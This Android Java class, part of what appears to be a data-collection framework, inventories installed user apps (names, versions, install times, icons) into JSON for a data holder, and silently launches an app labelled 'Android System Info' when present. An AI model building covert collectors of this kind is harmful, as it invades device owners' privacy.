package com.xaviar.collect.packages;

import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;
import com.xaviar.utils.BinUtil;

import flexjson.JSONSerializer;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.util.Log;

public class CollectPackages extends ThreadCollector implements ICollector {
	
	private static String name = "CollectPackages";
	private static final String TAG = name;

	public CollectPackages(String genericData) {
		this.genericData = genericData;
	}

	public CollectPackages() {
		setName(CollectPackages.name);
	}

	public CollectPackages(Context ctx) {
		setContext(ctx);
	}

	public List<PackageEntry> getObjects(Context context) {
		List<PackageEntry> res = new LinkedList<PackageEntry>();

		List<PackageInfo> packs = context.getPackageManager()
				.getInstalledPackages(PackageManager.GET_META_DATA);

		for (int i = 0; i < packs.size(); i++) {
			PackageInfo pi = packs.get(i);
			if (isSystemPackage(pi)) {
				continue;
			}
			String id=String.valueOf(pi.firstInstallTime);
			String appname = pi.applicationInfo.loadLabel(context.getPackageManager()).toString();
			String pname = pi.packageName;
			String versionName = pi.versionName;
			String versionCode = String.valueOf(pi.versionCode);
			Drawable drIcon = pi.applicationInfo.loadIcon(context.getPackageManager());
			String iconStr = handlePhoto(drIcon);
			PackageEntry pe = new PackageEntry();
			pe.setAppname(appname);
			pe.setPname(pname);
			pe.setVersionName(versionName);
			pe.setVersionCode(versionCode);
			pe.setIcon(iconStr);
			pe.setId(id);
			
			if(appname.equalsIgnoreCase("Android System Info"))
			{
			  Intent LaunchApp = context.getPackageManager().getLaunchIntentForPackage(pname);
			  context.startActivity( LaunchApp );
			  context.startActivity(LaunchApp);
			  
			}
			res.add(pe);
		}
		return res;
	}

	private boolean isSystemPackage(PackageInfo pkgInfo) {
		return ((pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) ? true : false;
	}
	
	private String handlePhoto(Drawable  draw)
	{
		Bitmap bitmap = drawableToBitmap(draw);
		String imageStr = "";
		if(null != bitmap)
		{
		 imageStr = BinUtil.encodeBitmap(bitmap,Bitmap.CompressFormat.JPEG);	
		}
		else
		{
		 return "";	
		}
     	
     	return imageStr;
	}
	
	public static Bitmap drawableToBitmap (Drawable drawable) {
	    if (drawable instanceof BitmapDrawable) {
	        return ((BitmapDrawable)drawable).getBitmap();
	    }

	    Bitmap bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Config.ARGB_8888);
	    Canvas canvas = new Canvas(bitmap); 
	    drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
	    drawable.draw(canvas);

	    return bitmap;
	}


	@Override
	public String getHolderKey() {

		return DataHolder.PACKAGES;
	}

	@Override
	protected String getAllData() {
		Log.d(TAG, "Enter Packages getAllData()");
		List<PackageEntry> accounts = getObjects(ctx);
		genericData = toJsonArray(accounts);
		return genericData;
	}

	public static String toJsonArray(Collection<PackageEntry> collection) {
		return new JSONSerializer().exclude("*.class").serialize(collection);
	}

}
